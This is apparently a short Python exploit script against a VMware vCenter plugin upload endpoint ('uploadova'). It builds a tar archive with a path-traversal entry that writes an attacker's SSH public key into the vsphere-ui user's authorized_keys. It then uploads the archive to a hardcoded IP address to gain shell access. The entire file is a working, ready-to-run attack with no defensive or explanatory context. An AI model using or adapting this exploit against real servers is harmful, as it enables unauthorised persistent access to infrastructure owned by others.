import tarfile
import os
from io import BytesIO
import requests

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}

def return_zip():
    with tarfile.open("test.tar", 'w') as tar:
        payload = BytesIO()
        id_rsa_pub='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDRLCR3ZE2afVKroUQMsrFcyuH/iJ/3KKldbUtZR1y7zZck2VyJvlg/jy307uwrxA//3z8hOfOM70HqypJxp5rmDsAAj9S5Vbzp+CMdydIxbj9/aiTQyE9Gyvirf5RRi9ank5wHh2i32HWdJixYBKd4XNIXZ0gy9KEnoyIrM+l43o0cb9CExqCOccbsWjNwR2QRy8ip3AJsUSKkT9k04/TveQrfRtTUpMzklKSk/pjzbNCh3xvMxgCd9EGSoiwuulh5vw0VfQZ4IcQ4+v69dCoNFIeIntj8s2MaC4hc6TV2ZRkUs5lD5CUxEIkAGyEjsFQrhP+TKxWa4uqTXIqKi3njF3NAsioCJc3cFjNBcwscEYBIVhBRJiZxI1XZ/EYDJUnZMoUrCwiTlrme9CuuPE8J/y0Jr6of0o2egqaoZMpsO+WJFdEkvbn5ktt1RnOCDbTcxSFS0R+fASR/zM/vEpVwlplD4T1ruxocmww9jq3IhtzhL2KlSE18dq9HEgwyF8= admin@LegalGrop56-003'
        tarinfo = tarfile.TarInfo(name='../../../home/vsphere-ui/.ssh/authorized_keys')
        f1 = BytesIO(id_rsa_pub.encode())
        tarinfo.size = len(f1.read())
        f1.seek(0)
        tar.addfile(tarinfo, fileobj=f1)
        tar.close()
        payload.seek(0)
def getshell(url):
    files = {'uploadFile':open('test.tar','rb')}
    try:
        r = requests.post(url=url, files=files,proxies=proxies,verify = False).text
        print(r)
    except:
        print('连接服务器失败')

if __name__ == "__main__":
    try:
        return_zip()
        url="https://188.124.10.35/ui/vropspluginui/rest/services/uploadova"
        getshell(url)
    except IOError as e:
        raise e